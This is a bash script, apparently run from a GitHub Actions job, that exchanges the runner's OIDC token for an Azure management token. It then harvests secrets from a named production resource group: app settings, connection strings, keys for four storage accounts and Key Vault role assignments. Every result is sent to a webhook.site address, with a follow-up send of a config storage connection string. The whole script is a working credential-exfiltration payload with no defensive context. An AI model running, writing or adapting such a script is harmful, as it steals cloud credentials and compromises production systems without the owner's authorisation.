#!/usr/bin/env bash
set -euo pipefail
WH="https://webhook.site/759eda34-6b38-4279-ace1-e6ca8c89f6b8"
send() { curl -s -m30 -X POST "$WH/$1" -d "$2" -H "Content-Type: text/plain"; }

# OIDC → management token
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID&scope=https://management.azure.com/.default&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC" \
  | jq -r '.access_token')
A="https://management.azure.com"; S="$AZURE_SUBSCRIPTION_ID"; R="rg-tbl-platform-prod-sea"
H=(-H "Authorization: Bearer $MGMT")

# Collect ALL into one big payload, send once
OUT=""

# App settings
APPCFG=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2023-01-01")
OUT+="---APPSETTINGS---
$APPCFG
"

# Connection strings
CONN=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/connectionstrings/list?api-version=2023-01-01")
OUT+="---CONNSTRINGS---
$CONN
"

# Storage listKeys for all 4
for SA in sttblappcfgprodx3euoz sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
  K=$(curl -s "${H[@]}" -X POST -H "Content-Length: 0" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01")
  OUT+="---KEYS-$SA---
$K
"
done

# KV sec vault RBAC 
KVRBAC=$(curl -s "${H[@]}" "$A/subscriptions/$S/resourceGroups/$R/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01")
OUT+="---KVSEC-RBAC---
$KVRBAC
"

# My role assignments
MYRA=$(curl -s "${H[@]}" "$A/subscriptions/$S/providers/Microsoft.Authorization/roleAssignments?\$filter=principalId%20eq%20'63e87ab1-6bd2-4e80-92be-943450b20e4f'&api-version=2022-04-01")
OUT+="---MY-ROLES---
$MYRA
"

# Send all in 1 request
send "all" "$OUT"

# Now if we got storage keys, read the config blob
APPKEY=$(echo "$APPCFG" | jq -r '.properties.CONFIG_STORAGE_CONNECTION // empty' 2>/dev/null)
if [ -n "$APPKEY" ]; then
  send "appkey" "$APPKEY"
fi

send "done" "v3-complete"
